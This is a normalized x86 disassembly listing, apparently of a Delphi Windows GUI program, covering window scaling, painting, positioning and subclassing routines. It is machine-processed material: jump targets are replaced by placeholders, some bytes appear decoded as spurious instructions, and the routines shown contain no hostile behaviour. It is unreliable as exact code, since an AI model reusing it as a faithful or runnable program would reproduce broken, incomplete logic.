call sub_40331c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_40331c
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d814
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_46646c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46709d
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_4670b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_4670f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_467a68
sub_4670f6
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403518
test al al
jne r-xdata
call sub_403b4c
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403af8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_467a68
sub_46712c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_46716d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_46718c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_450988
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403518
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_469434
sub_4671c8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44dd84
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418b9c
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_46882c
mov edx esi
mov eax ebp
call sub_418e94
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_468804
mov edx esi
mov eax edi
call sub_46882c
jmp r-xdata
xor edx edx
mov eax edi
call sub_4687e0
sub_4672d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45194c
xor edx edx
push ebp
push sub_46752a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4510a8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e2d0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44e314
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_46765c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44fa80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467531
mov eax [ ebp - 0x4 ]
call sub_451954
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_466934
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_454b78
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_466934
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_454b78
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_424ce0
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_424ce8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_467539
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4523f4
push 0x0
push 0x0
push ebx
push sub_467640
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46760c
push ebx
push sub_467624
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4675eb
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41cd04
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44e9e0
sub_467677
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_466934
mov ecx edi
mov edx esi
mov eax ebx
call sub_454b78
mov eax ebx
call sub_467760
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_424d84
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_424da0
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44e2fc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_44e2b8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_467a08
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_467a38
sub_467704
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_469a64
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4550b4
push eax
call SendMessageA
pop ebx
retn
sub_467798
push ebx
mov ebx eax
mov eax ebx
call sub_4686b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_46782c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_45517c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4678b4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_455658
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_4220a0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_422074
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403518
test al al
jne r-xdata
sub_467920
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403264
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46794c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov eax ebp
call sub_451de4
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_4220a0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4556a0
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_422074
mov si 0xfff1
call sub_403518
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4220b0
jmp r-xdata
sub_4679e0
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44ea9c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44fa80
sub_467a08
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44e2d0
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_467a38
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44e314
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_467a68
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_44e7d4
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_468ba0
pop esi
pop ebx
retn
sub_467aac
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_467b05
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467b0c
lea eax [ ebp - 0x4 ]
call sub_404118
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_467b14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e788
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_45260c
mov eax ebx
call sub_4527a8
sub_467b4c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_421eec
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_467b8c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452ac8
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403518
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403518
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44fa80
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44fa80
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_461c54
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4684b8
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467e05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467de8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_425b4c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4259ec
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_46313c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467def
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425b4c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_461c54
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4684b8
call sub_4550b4
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_467f33
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467f0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467eef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_425b4c
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_4259ec
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467ef6
xor edx edx
mov eax [ ebp - 0xc ]
call sub_425b4c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4550b4
mov esi eax
sub_467f13
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4550b4
push eax
call ReleaseDC
retn
sub_467fc4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_468010
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4684ec
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_468538
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_468050
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_46821e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_425300
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44e3f8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44d1f0
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_467fc4
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_425300
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_4684ec
test eax eax
je r-xdata
push ebp
call sub_467fc4
pop ecx
push ebp
call sub_467fc4
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_468010
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_465314
jmp r-xdata
sub_468230
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_4664f8
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_46829c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_466b94
mov eax ebx
call sub_4553b8
test al al
je r-xdata
mov eax ebx
call sub_4220a0
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_451ed8
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_422074
call sub_462798
mov edx esi
mov eax ebx
call sub_422074
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
sub_468334
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_4683b1
